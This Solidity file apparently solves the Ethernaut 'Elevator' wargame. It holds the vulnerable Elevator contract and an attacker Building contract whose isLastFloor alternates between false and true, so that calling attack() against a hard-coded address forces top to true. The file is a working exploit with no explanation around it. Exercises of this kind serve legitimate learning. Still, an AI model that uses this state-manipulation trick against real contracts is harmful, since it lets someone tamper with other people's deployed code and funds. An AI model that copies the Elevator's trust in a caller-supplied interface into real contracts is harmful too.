// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Building {
    address target = 0x45f87994c073a3F06A25a7EBcc90FAa6bF5C444C;
    Elevator ev = Elevator(target);
    bool status = false;
    function isLastFloor(uint256) external returns (bool){
        if(status == false){
            status = true;
            return false;
        }
        status = false;
        return true;
    }
    function attack() public {
        ev.goTo(114514);
    }
}